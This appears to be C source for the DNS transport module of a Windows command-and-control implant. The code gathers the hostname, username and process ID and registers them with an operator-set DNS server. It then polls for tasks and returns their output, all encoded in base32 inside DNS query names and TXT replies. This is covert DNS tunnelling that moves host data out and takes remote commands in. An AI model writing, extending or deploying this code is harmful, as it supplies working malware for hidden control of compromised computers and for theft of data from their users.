#include "transport_dns.h"
#include "transport.h"
#include "config.h"
#include <windows.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#define SECURITY_WIN32
#include <secext.h>

// ── Base32 (RFC 4648, no padding, lowercase) ──────────────────────────────────

static const char B32L[] = "abcdefghijklmnopqrstuvwxyz234567";

static char* dns_b32_encode(const uint8_t *data, size_t len) {
    size_t out_cap = (len * 8 + 4) / 5 + 2;
    char *out = (char*)malloc(out_cap);
    if (!out) return NULL;
    size_t j = 0;
    uint64_t buf = 0;
    int bits = 0;
    for (size_t i = 0; i < len; i++) {
        buf = (buf << 8) | data[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[j++] = B32L[(buf >> bits) & 0x1f];
        }
    }
    if (bits > 0) out[j++] = B32L[(buf << (5 - bits)) & 0x1f];
    out[j] = '\0';
    return out;
}

static int b32_char_val(char c) {
    if (c >= 'a' && c <= 'z') return c - 'a';
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1;
}

static uint8_t* dns_b32_decode(const char *s, size_t *out_len) {
    size_t slen = strlen(s);
    size_t max_out = slen * 5 / 8 + 2;
    uint8_t *out = (uint8_t*)malloc(max_out);
    if (!out) { *out_len = 0; return NULL; }
    size_t j = 0;
    uint64_t buf = 0;
    int bits = 0;
    for (size_t i = 0; i < slen; i++) {
        int v = b32_char_val(s[i]);
        if (v < 0) continue;
        buf = (buf << 5) | (uint64_t)v;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            out[j++] = (uint8_t)(buf >> bits);
        }
    }
    out[j] = '\0';
    *out_len = j;
    return out;
}

// ── FNV-1a 64-bit ─────────────────────────────────────────────────────────────

static uint64_t fnv64(const char *s) {
    uint64_t h = 14695981039346656037ULL;
    for (; *s; s++) {
        h ^= (uint8_t)*s;
        h *= 1099511628211ULL;
    }
    return h;
}

// ── DNS TXT wire helpers ──────────────────────────────────────────────────────

static uint8_t* build_dns_query(const char *qname, size_t *out_len) {
    size_t qlen  = strlen(qname);
    uint8_t *msg = (uint8_t*)malloc(qlen + 30);
    if (!msg) return NULL;
    size_t n = 0;
    msg[n++]=0xab; msg[n++]=0xcd;
    msg[n++]=0x01; msg[n++]=0x00;
    msg[n++]=0x00; msg[n++]=0x01;
    msg[n++]=0x00; msg[n++]=0x00;
    msg[n++]=0x00; msg[n++]=0x00;
    msg[n++]=0x00; msg[n++]=0x00;
    char q[4096]; strncpy(q, qname, sizeof(q)-1); q[sizeof(q)-1]='\0';
    char *p = q;
    while (*p == '.') p++;
    char *tok = strtok(p, ".");
    while (tok) {
        size_t llen = strlen(tok);
        msg[n++] = (uint8_t)llen;
        memcpy(msg+n, tok, llen); n += llen;
        tok = strtok(NULL, ".");
    }
    msg[n++]=0x00;
    msg[n++]=0x00; msg[n++]=0x10;
    msg[n++]=0x00; msg[n++]=0x01;
    *out_len = n;
    return msg;
}

// Returns heap-alloc'd NUL-terminated string (caller must free), or NULL.
static char* parse_dns_txt(const uint8_t *buf, int got) {
    if (got < 12) return NULL;
    int ancount = (int)(buf[6]) << 8 | buf[7];
    if (ancount == 0) return NULL;
    int pos = 12;
    while (pos < got) {
        if (buf[pos] == 0) { pos++; break; }
        if ((buf[pos] & 0xC0) == 0xC0) { pos += 2; break; }
        pos += (int)buf[pos] + 1;
    }
    if (pos + 4 > got) return NULL;
    pos += 4;
    for (int i = 0; i < ancount; i++) {
        if (pos >= got) break;
        while (pos < got) {
            if (buf[pos] == 0) { pos++; break; }
            if ((buf[pos] & 0xC0) == 0xC0) { pos += 2; break; }
            pos += (int)buf[pos] + 1;
        }
        if (pos + 10 > got) break;
        int rtype = (int)(buf[pos]) << 8 | buf[pos+1];
        pos += 8;
        int rdlen = (int)(buf[pos]) << 8 | buf[pos+1];
        pos += 2;
        if (pos + rdlen > got) break;
        if (rtype == 16 && rdlen > 0) {
            int rpos = pos, end = pos + rdlen;
            char *txt = (char*)malloc(rdlen + 1);
            if (!txt) { pos += rdlen; continue; }
            size_t tlen = 0;
            while (rpos < end) {
                int sl = (int)(uint8_t)buf[rpos++];
                if (rpos + sl > end) break;
                memcpy(txt + tlen, buf + rpos, sl);
                tlen += sl; rpos += sl;
            }
            txt[tlen] = '\0';
            pos += rdlen;
            return txt;
        }
        pos += rdlen;
    }
    return NULL;
}

// Returns heap-alloc'd NUL-terminated string, or NULL on failure.
static char* dns_query(const char *server, const char *qname) {
    char host[256] = {0}; int port = 53;
    const char *colon = strrchr(server, ':');
    if (colon) {
        size_t hl = (size_t)(colon - server);
        if (hl < sizeof(host)) { memcpy(host, server, hl); host[hl] = '\0'; }
        port = atoi(colon + 1);
    } else {
        strncpy(host, server, sizeof(host)-1);
    }

    WSADATA wsd; WSAStartup(MAKEWORD(2,2), &wsd);
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return NULL;

    DWORD tv_ms = 5000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_ms, sizeof(tv_ms));

    struct sockaddr_in dst = {0};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons((u_short)port);
    dst.sin_addr.s_addr = inet_addr(host);

    size_t msg_len = 0;
    uint8_t *msg = build_dns_query(qname, &msg_len);
    if (!msg) { closesocket(sock); return NULL; }

    sendto(sock, (const char*)msg, (int)msg_len, 0,
        (struct sockaddr*)&dst, sizeof(dst));
    free(msg);

    uint8_t buf[4096];
    int got = recvfrom(sock, (char*)buf, sizeof(buf), 0, NULL, NULL);
    closesocket(sock);
    if (got <= 0) return NULL;
    return parse_dns_txt(buf, got);
}

// ── Transport operations ──────────────────────────────────────────────────────

int transport_dns_register(void) {
    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
    DWORD hsz=sizeof(hostname);
    GetComputerNameA(hostname, &hsz);
    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG usz=sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
        GetUserNameA(username, (DWORD*)&usz);
    char username_j[512]={0};
    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
        if (username[_i]=='\\') username_j[_j++]='\\';
        username_j[_j++]=username[_i];
    }
    unsigned long pid = (unsigned long)GetCurrentProcessId();

    // Compute FNV-1a agent ID from hostname+pid
    char id_input[256];
    snprintf(id_input, sizeof(id_input), "%s%lu", hostname, pid);
    uint64_t h = fnv64(id_input);
    snprintf(g_agent.agent_id, sizeof(g_agent.agent_id), "%016llx", (unsigned long long)h);
    g_agent.has_key = 0;

    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
        "\"pid\":%lu,\"aes_key\":\"\",\"language\":\"c\"}",
        hostname, username_j, pid);

    char *encoded = dns_b32_encode((const uint8_t*)body, strlen(body));
    if (!encoded) return 0;
    size_t elen  = strlen(encoded);
    int    total = (int)((elen + 47) / 48);
    const char *server = AGENT_DNS_SERVER;
    const char *domain = AGENT_DNS_DOMAIN;

    for (int seq = 0; seq < total; seq++) {
        int   start    = seq * 48;
        int   chunklen = (int)(elen - start);
        if (chunklen > 48) chunklen = 48;
        char  chunk[50]; memcpy(chunk, encoded + start, chunklen); chunk[chunklen]='\0';
        char  qname[1024];
        snprintf(qname, sizeof(qname), "reg.%s.%d.%d.%s.%s",
            chunk, seq, total, g_agent.agent_id, domain);
        char *resp = dns_query(server, qname);
        int   ok   = (resp && strncmp(resp, "ok", 2) == 0);
        free(resp);
        if (!ok) { free(encoded); return 0; }
    }
    free(encoded);
    return 1;
}

AgentTask* transport_dns_beacon(int *count) {
    *count = 0;
    const char *server = AGENT_DNS_SERVER;
    const char *domain = AGENT_DNS_DOMAIN;

    char qname[512];
    snprintf(qname, sizeof(qname), "poll.%s.%s", g_agent.agent_id, domain);
    char *resp = dns_query(server, qname);
    if (!resp || strcmp(resp, "nil") == 0) { free(resp); return NULL; }

    char *encoded = NULL;
    if (strncmp(resp, "more:", 5) == 0) {
        int total = atoi(resp + 5);
        free(resp); resp = NULL;
        size_t elen = 0;
        for (int i = 0; i < total; i++) {
            char cq[512];
            snprintf(cq, sizeof(cq), "chunk.%d.%s.%s", i, g_agent.agent_id, domain);
            char *cr = dns_query(server, cq);
            if (!cr) { free(encoded); return NULL; }
            const char *data = (strncmp(cr, "chunk:", 6)==0) ? cr+6 : cr;
            size_t dlen = strlen(data);
            char *ne = (char*)realloc(encoded, elen + dlen + 1);
            if (!ne) { free(cr); free(encoded); return NULL; }
            encoded = ne;
            memcpy(encoded + elen, data, dlen);
            elen += dlen; encoded[elen] = '\0';
            free(cr);
        }
    } else {
        encoded = resp; resp = NULL;
    }

    size_t dec_len = 0;
    uint8_t *decoded = dns_b32_decode(encoded, &dec_len);
    free(encoded);
    if (!decoded || dec_len == 0) { free(decoded); return NULL; }

    AgentTask *tasks = (AgentTask*)calloc(1, sizeof(AgentTask));
    if (!tasks) { free(decoded); return NULL; }

    char *text = (char*)decoded;
    tasks[0].id = (long long)atoll(strstr(text, "\"id\":") ? strstr(text, "\"id\":")+5 : "0");
    {
        const char *tp = strstr(text, "\"type\":");
        if (tp) {
            tp += 7; while (*tp=='"'||*tp==' ') tp++;
            size_t k=0;
            while (tp[k] && tp[k]!='"' && k<63) { tasks[0].type[k]=tp[k]; k++; }
            tasks[0].type[k]='\0';
        }
    }
    {
        const char *ap = strstr(text, "\"args\":");
        if (ap) {
            ap += 7; while (*ap==':'||*ap==' ') ap++;
            if (*ap=='"') { ap++; }
            size_t k=0; const char *s=ap;
            while (*s && *s!='"') { k++; s++; }
            tasks[0].args = (char*)malloc(k+1);
            if (tasks[0].args) { memcpy(tasks[0].args, ap, k); tasks[0].args[k]='\0'; }
        } else {
            tasks[0].args = NULL;
        }
    }
    tasks[0].payload = NULL; tasks[0].payload_len = 0;
    free(decoded);
    *count = 1;
    return tasks;
}

void transport_dns_send_result(long long task_id, const char *output, const char *error) {
    const char *server = AGENT_DNS_SERVER;
    const char *domain = AGENT_DNS_DOMAIN;

    char body[4096];
    snprintf(body, sizeof(body),
        "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\"}",
        task_id, output ? output : "", error ? error : "");

    char *encoded = dns_b32_encode((const uint8_t*)body, strlen(body));
    if (!encoded) return;
    size_t elen  = strlen(encoded);
    int    total = (int)((elen + 47) / 48);

    char task_hex[32];
    snprintf(task_hex, sizeof(task_hex), "%llx", (long long)task_id);

    for (int seq = 0; seq < total; seq++) {
        int   start    = seq * 48;
        int   chunklen = (int)(elen - start);
        if (chunklen > 48) chunklen = 48;
        char  chunk[50]; memcpy(chunk, encoded + start, chunklen); chunk[chunklen]='\0';
        char  qname[1024];
        snprintf(qname, sizeof(qname), "res.%s.%d.%d.%s.%s.%s",
            chunk, seq, total, task_hex, g_agent.agent_id, domain);
        char *resp = dns_query(server, qname);
        free(resp);
    }
    free(encoded);
}
